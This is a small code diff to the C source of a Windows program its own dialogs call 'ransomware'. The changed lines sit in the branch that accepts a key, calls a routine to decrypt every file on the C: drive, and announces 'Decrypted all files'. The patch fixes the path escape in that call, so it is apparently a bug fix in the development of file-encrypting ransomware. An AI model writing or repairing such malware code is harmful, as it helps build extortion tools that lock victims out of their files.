@@ -105,7 +105,7 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
                 MessageBoxA(hWnd, "It is not a decryption key for this program.", "ransomware", MB_OK);
             else {
                 MessageBoxA(hWnd, "Don't feel too bad about it. It was just bad luck.", "ransomware", MB_OK);
-                all_files_enc_dec("C:\", key, FALSE);
+                all_files_enc_dec("C:\\", key, FALSE);
                 MessageBoxA(hWnd, "Decrypted all files.", "ransomware", MB_OK);
                 PostQuitMessage(0);
             }
